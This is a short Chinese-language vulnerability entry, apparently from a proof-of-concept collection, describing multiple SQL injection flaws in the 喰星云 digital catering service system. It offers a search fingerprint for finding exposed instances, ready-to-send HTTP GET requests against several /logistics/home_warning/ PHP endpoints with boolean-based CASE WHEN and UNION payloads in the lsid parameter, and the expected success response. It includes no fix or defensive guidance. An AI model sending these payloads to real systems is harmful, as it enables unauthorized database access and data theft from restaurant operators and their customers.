# 喰星云数字化餐饮服务系统多处SQL注入漏洞

- **系统**：喰星云数字化餐饮服务系统多处　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="tmp_md5_pwd"`
- **请求**：`GET /logistics/home_warning/php/not_out_depot.php?do=getList&lsid=(SELECT%20(CASE%20WHEN%20(5630=5631)%20THEN%202%20ELSE%20(SELECT%207330%20UNION%20SELECT%203010)%20END)) HTTP/1.1`
- **关键头**：`Priority: u=0, i`

**请求体 / payload**
```
GET /logistics/home_warning/php/shelflife.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289765%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29 HTTP/1.1
Host:
Priority: u=0, i
GET /logistics/home_warning/php/not_finish.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289765%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29 HTTP/1.1
Host:
Priority: u=0, i
GET /logistics/home_warning/php/stock.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289765%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29 HTTP/1.1
Host:
Priority: u=0, i
```
- **预期**：200　|　Success